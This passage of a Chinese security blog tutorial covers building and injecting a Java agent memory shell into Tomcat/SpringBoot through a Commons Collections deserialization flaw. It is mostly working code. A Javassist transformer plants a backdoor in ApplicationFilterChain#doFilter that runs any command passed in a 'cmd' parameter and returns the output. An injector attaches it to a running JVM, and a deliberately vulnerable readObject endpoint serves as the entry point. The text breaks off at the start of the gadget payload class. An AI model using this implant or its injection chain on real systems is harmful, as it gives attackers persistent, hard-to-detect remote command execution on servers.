retransformClasses()，并且这些子类都成功被重转换（retransform success）<br>Found HttpServlet subclass: class org.apache.jsp.index_jsp<br>Retransform subclass Success: class org.apache.jsp.index_jsp<br>Found HttpServlet subclass: class com.src.testtomcat.HelloServlet<br>Retransform subclass Success: class com.src.testtomcat.HelloServlet<br>Found HttpServlet subclass: class org.apache.jasper.runtime.HttpJspBase<br>Retransform subclass Success: class org.apache.jasper.runtime.HttpJspBase<br>Found HttpServlet subclass: class org.apache.jasper.servlet.JspServlet<br>[Debug] Loading class: org/apache/jasper/servlet/JspServlet<br>Retransform subclass Success: class org.apache.jasper.servlet.JspServlet<br>Found HttpServlet subclass: class org.apache.catalina.servlets.DefaultServlet<br>[Debug] Loading class: org/apache/catalina/servlets/DefaultServlet<br>Retransform subclass Success: class org.apache.catalina.servlets.DefaultServlet<br><br>//成功对 javax.servlet.http.HttpServlet（基类） 做了 transform（插入/修改字节码），并把修改生效了（retransform success）<br>Found HttpServlet (base): class javax.servlet.http.HttpServlet<br>[Debug] Loading class: javax/servlet/http/HttpServlet<br>[+] Found target class: javax.servlet.http.HttpServlet<br>[+] Start transforming HttpServlet...<br>[+] HttpServlet Transformed Complete.<br>Retransform HttpServlet Success.<br><br>//transform() 调用中抛出了 NullPointerException<br>[!] Transform failed: java.lang.NullPointerException<br>java.lang.NullPointerException<br>at com.src.agent.ServletTransformer.transform(ServletTransformer.java:28)<br>at sun.instrument.TransformerManager.transform(TransformerManager.java:188)<br>at sun.instrument.InstrumentationImpl.transform(InstrumentationImpl.java:428)<br>at sun.misc.Unsafe.defineAnonymousClass(Native Method)<br>at java.lang.invoke.InnerClassLambdaMetafactory.spinInnerClass(InnerClassLambdaMetafactory.java:326)<br>at java.lang.invoke.InnerClassLambdaMetafactory.buildCallSite(InnerClassLambdaMetafactory.java:194)<br>at java.lang.invoke.LambdaMetafactory.metafactory(LambdaMetafactory.java:304)<br>at java.lang.invoke.CallSite.makeSite(CallSite.java:302)<br>at java.lang.invoke.MethodHandleNatives.linkCallSiteImpl(MethodHandleNatives.java:307)<br>at java.lang.invoke.MethodHandleNatives.linkCallSite(MethodHandleNatives.java:297)<br>at org.apache.tomcat.util.http.Parameters.addParameter(Parameters.java:212)<br>at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:390)<br>at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:481)<br>at org.apache.tomcat.util.http.Parameters.handleQueryParameters(Parameters.java:194)<br>at org.apache.catalina.connector.Request.parseParameters(Request.java:2938)<br>at org.apache.catalina.connector.Request.getParameter(Request.java:1088)<br>at org.apache.catalina.connector.RequestFacade.getParameter(RequestFacade.java:309)<br>at javax.servlet.http.HttpServlet.service(HttpServlet.java)<br>at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)<br>at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:199)<br>at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)<br>at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)<br>at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)<br>at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)<br>at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:168)<br>at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)<br>at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482)<br>at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)<br>at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)<br>at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:656)<br>at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)<br>at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)<br>at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:397)<br>at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)<br>at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:935)<br>at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1792)<br>at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)<br>at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)<br>at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)<br>at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)<br>at java.lang.Thread.run(Thread.java:745)<br></code></pre></td></tr></table></figure><p>可以执行命令：</p><p>（：但是当前的内存马只是部分生效，&#x2F;hello-servlet 路径可以执行，其他不可以</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523380.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523450.png" alt="img"></p><h3 id="4-3-2-方式二"><a href="#4-3-2-方式二" class="headerlink" title="4.3.2 方式二"></a>4.3.2 方式二</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>SpringBoot 2.6.13  </p><p>CommonCollection 3.2.1</p><p>搭建一个反序列化环境：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentFilter</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/cc&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">cc11Vuln</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span>  request.getInputStream();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(inputStream);<br>        objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello,World&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/demo&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is OK Demo!&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525866.png" alt="img"></p><h4 id="寻找关键类"><a href="#寻找关键类" class="headerlink" title="寻找关键类"></a>寻找关键类</h4><p>在Filter中存在doFilter方法，除了会对我们的请求进行过滤，会依次调用FilterChains中的Filter，同时在 <code>ApplicationFilterChain#doFilter</code> 中还封装了我们用户请求的 request 和 response ，那么如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523934.png" alt="img"></p><h4 id="反序列化注入"><a href="#反序列化注入" class="headerlink" title="反序列化注入"></a>反序列化注入</h4><p>注入流程如下：</p><ol><li>编写 agent.jar 从而实现 <code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code> 进行字节码修改</li><li>利用 <code>CC依赖</code> 的反序列化漏洞将我们的加载代码打进去，然后使其执行来加载我们的 agent.jar</li></ol><h4 id="agent-jar"><a href="#agent-jar" class="headerlink" title="agent.jar"></a>agent.jar</h4><p>pom.xml </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.src<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Demo02<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.29.2-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>AgentMain.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation ins)</span> &#123;<br>        ins.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefineTransformer</span>(),<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 获取所有已加载的类</span><br>        Class[] classes = ins.getAllLoadedClasses();<br>        <span class="hljs-keyword">for</span> (Class clas:classes)&#123;<br>            <span class="hljs-keyword">if</span> (clas.getName().equals(ClassName))&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    <span class="hljs-comment">// 对类进行重新定义</span><br>                    ins.retransformClasses(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clas&#125;);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>DefineTransformer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>        className = className.replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">if</span> (className.equals(ClassName))&#123;<br>            System.out.println(<span class="hljs-string">&quot;Find the Inject Class: &quot;</span> + ClassName);<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> pool.getCtClass(className);<br>                <span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>                m.insertBefore(<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;if (cmd != null)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    try &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        String line;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().flush();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().close();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        e.printStackTrace();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;&#125;&quot;</span>);<br>                <span class="hljs-type">byte</span>[] bytes = c.toBytecode();<br><br>                c.detach();<br><br>                <span class="hljs-keyword">return</span> bytes;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>maven 打包后 得到的 target&#x2F;Demo02-1.0-SNAPSHOT.jar  就是我们需要的 agent.jar</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523970.png" alt="img"></p><p>编写java代码来将其加载进JVM中</p><p>其中大致思路为获取到JVM的PID，调用 loadAgent 方法将 agent.jar 注入</p><h4 id="InjectMain-java"><a href="#InjectMain-java" class="headerlink" title="InjectMain.java"></a>InjectMain.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\JavaCode\\内存马\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar&quot;</span>;<br>            java.io.<span class="hljs-type">File</span> <span class="hljs-variable">toolsPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>).replace(<span class="hljs-string">&quot;jre&quot;</span>,<span class="hljs-string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="hljs-string">&quot;tools.jar&quot;</span>);<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> toolsPath.toURI().toURL();<br>            java.net.<span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;url&#125;);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">listMethod</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-literal">null</span>);<br>            java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="hljs-literal">null</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Running JVM list ...&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> list.get(i);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;displayName&quot;</span>,<span class="hljs-literal">null</span>);<br>                java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (java.lang.String) displayName.invoke(o,<span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">// 列出当前有哪些 JVM 进程在运行</span><br>                <span class="hljs-comment">// 这里的 if 条件根据实际情况进行更改</span><br>                <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;com.src.Demo02EnvApplication&quot;</span>))&#123;<br>                    <span class="hljs-comment">// 获取对应进程的 pid 号</span><br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getId</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-literal">null</span>);<br>                    java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> (java.lang.String) getId.invoke(o,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;id &gt;&gt;&gt; &quot;</span> + id);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">attach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;attach&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> attach.invoke(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;id&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">loadAgent</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;loadAgent&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    loadAgent.invoke(vm,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;path&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">detach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;detach&quot;</span>,<span class="hljs-literal">null</span>);<br>                    detach.invoke(vm,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;Agent.jar Inject Success !!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523682.png" alt="img"></p><h4 id="CC-反序列化注入"><a href="#CC-反序列化注入" class="headerlink" title="CC 反序列化注入"></a>CC 反序列化注入</h4><p>通过CC反序列化进行注入Agent内存马， 编译生成 <code>Test.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            java.lang.<span class="hljs-type">String</span> <span 